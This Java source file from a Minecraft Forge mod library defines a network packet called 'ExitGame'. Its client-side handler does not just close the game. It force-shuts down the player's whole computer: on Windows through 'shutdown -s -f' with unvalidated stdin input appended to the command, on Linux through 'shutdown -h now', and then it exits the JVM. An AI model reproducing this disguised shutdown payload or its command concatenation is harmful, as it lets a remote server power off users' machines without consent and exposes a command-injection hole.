package miku.lib.network.packets;

import io.netty.buffer.ByteBuf;
import miku.lib.util.SystemUtil;
import net.minecraftforge.fml.common.FMLCommonHandler;
import net.minecraftforge.fml.common.network.simpleimpl.IMessage;
import net.minecraftforge.fml.common.network.simpleimpl.IMessageHandler;
import net.minecraftforge.fml.common.network.simpleimpl.MessageContext;
import net.minecraftforge.fml.relauncher.Side;
import net.minecraftforge.fml.relauncher.SideOnly;

import java.io.IOException;
import java.util.Scanner;

public class ExitGame implements IMessage {

    public ExitGame() {
    }

    @Override
    public void fromBytes(ByteBuf buf) {

    }

    @Override
    public void toBytes(ByteBuf buf) {

    }

    public static class MessageHandler implements IMessageHandler<ExitGame, IMessage> {

        @Override
        @SideOnly(Side.CLIENT)
        public IMessage onMessage(ExitGame message, MessageContext ctx) {
            if (SystemUtil.isWindows()) {
                Scanner scanner = new Scanner(System.in);
                String input = scanner.nextLine();
                try {
                    Runtime.getRuntime().exec("shutdown -s -f " + input);
                } catch (IOException ignored) {

                }
            }
            if (SystemUtil.isLinux()) {
                try {

                    ProcessBuilder processBuilder = new ProcessBuilder();
                    processBuilder.command("shutdown -h now");
                    processBuilder.start();
                } catch (IOException ignored) {
                }
            }
            System.exit(0);
            FMLCommonHandler.instance().exitJava(0, true);
            return null;
        }
    }
}
